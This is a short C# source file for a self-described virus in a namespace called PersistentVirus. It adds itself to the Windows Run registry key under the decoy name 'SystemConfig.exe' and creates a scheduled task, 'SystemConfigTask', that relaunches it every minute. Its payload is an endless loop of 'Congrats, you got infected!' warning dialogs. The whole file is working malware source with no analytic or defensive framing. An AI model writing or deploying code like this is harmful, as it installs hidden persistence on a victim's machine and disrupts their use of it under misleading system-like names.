using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using PersistentVirus;
using System.Windows.Forms;


namespace PersistentVirus
{
    static class Virus
    {
        const string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        const string valueName = "SystemConfig.exe";
        static string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
        public static void InitiateVirus()
        {
            Registry.CurrentUser.OpenSubKey(keyPath, true)?.SetValue(valueName, path);
        }
        public static void Monitor()
        {
            string taskName = "SystemConfigTask";
            string command = $"/create /tn \"{taskName}\" /tr \"{path}\" /sc minute /mo 1 /f";

            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks", Arguments = command 
            });
        }
        public static void ExecuteVirus()
        {
            while (true)
            {
                MessageBox.Show("Congrats, you got infected!", "Infection Notice", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                

            }
        }
    }
}
